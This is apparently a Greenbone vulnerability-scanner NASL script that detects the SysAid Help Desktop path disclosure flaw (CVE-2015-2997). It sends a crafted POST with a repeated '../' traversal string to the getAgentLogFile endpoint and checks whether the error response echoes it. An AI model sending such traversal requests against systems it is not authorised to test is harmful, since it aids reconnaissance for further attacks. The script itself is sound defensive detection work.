CPE = "cpe:/a:sysaid:sysaid";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106008" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-06-11 10:02:43 +0700 (Thu, 11 Jun 2015)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_cve_id( "CVE-2015-2997" );
	script_name( "SysAid Path Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_sysaid_detect.sc" );
	script_mandatory_keys( "sysaid/detected" );
	script_tag( name: "summary", value: "SysAid Help Desktop Software is prone to a path disclosure
  vulnerability" );
	script_tag( name: "vuldetect", value: "Send a crafted POST request and check the response." );
	script_tag( name: "impact", value: "An attacker can find the install path the application is installed
  under which may help in further attacks." );
	script_tag( name: "affected", value: "SysAid Help Desktop version 15.1.x and before." );
	script_tag( name: "solution", value: "Upgrade to version 15.2 or later." );
	script_xref( name: "URL", value: "https://www.security-database.com/detail.php?alert=CVE-2015-2997" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: port );
traversal = crap( data: "../", length: 3 * 20 );
url = dir + "/getAgentLogFile?accountId=" + traversal + rand_str( length: 12 ) + "&computerId=" + rand_str( length: 14 );
data = raw_string( 0x78, 0x9c, 0x4b, 0x2b, 0x30, 0x0d, 0x33, 0x89, 0xc8, 0x0b, 0x2b, 0x01, 0x00, 0x0f, 0x64, 0x03, 0x26 );
req = NASLString( "POST ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "Content-Type: application/octet-stream\r\n", "Content-Length: " + strlen( data ), "\r\n\r\n", data );
buf = http_keepalive_send_recv( port: port, data: req );
if(buf && IsMatchRegexp( buf, "Internal Error No#" )){
	if(egrep( pattern: traversal, string: buf )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

